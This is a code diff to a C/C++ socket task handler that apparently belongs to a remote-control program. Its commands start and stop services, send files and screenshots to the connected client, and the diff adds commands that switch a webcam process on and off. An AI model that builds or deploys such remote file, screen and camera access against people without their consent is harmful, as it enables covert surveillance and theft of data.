@@ -55,27 +55,27 @@ int doTasks(SOCKET ClientSocket, TASK a) {
 			else sendStr(ClientSocket, L"File is sent!");
 		}
 	}
-	
+
 	else if (wcscmp(a.TaskName, L"STARTSERVICE") == 0) {
 		res = DoStartSvc(a.TaskDescribe);
 		if (res) iSentResult = sendStr(ClientSocket, L"Starting service is finished");
 		else iSentResult = sendStr(ClientSocket, L"Failed to start service!");
 		if (iSentResult <= 0) res = -1;
 	}
-	
+
 	else if (wcscmp(a.TaskName, L"STOPSERVICE") == 0) {
 		res = DoStopSvc(a.TaskDescribe);
 		if (res) iSentResult = sendStr(ClientSocket, L"Stopping service is finished");
 		else iSentResult = sendStr(ClientSocket, L"Failed to stop service!");
 		if (iSentResult <= 0) res = -1;
 	}
-	
+
 	else if (wcscmp(a.TaskName, L"SENDFILE") == 0) {
 		int64_t rc = SendFile(ClientSocket, a.TaskDescribe);
 		if (rc < 0) return -1;
 		else sendStr(ClientSocket, L"File is sent!");
 	}
-	
+
 	else if (wcscmp(a.TaskName, L"SCREENCAPTURE") == 0) {
 		res = SaveBitmap(a.TaskDescribe);
 		if (res == 1) {
@@ -83,6 +83,16 @@ int doTasks(SOCKET ClientSocket, TASK a) {
 			if (rc < 0) return -1;
 			else sendStr(ClientSocket, L"File is sent!");
 		}
+	}
+	else if (wcscmp(a.TaskName, L"TURNONCAMERA") == 0) {
+		wchar_t convertedReq[] = L"STARTPROCESS WebcamIntegrated.exe";
+		TASK t = request2TASK(convertedReq);
+		return doTasks(ClientSocket, t);
+	}
+	else if (wcscmp(a.TaskName, L"TURNOFFCAMERA") == 0) {
+		wchar_t convertedReq[] = L"KILLPROCESS WebcamIntegrated.exe";
+		TASK t = request2TASK(convertedReq);
+		return doTasks(ClientSocket, t);
 	}
 	return res;
 }
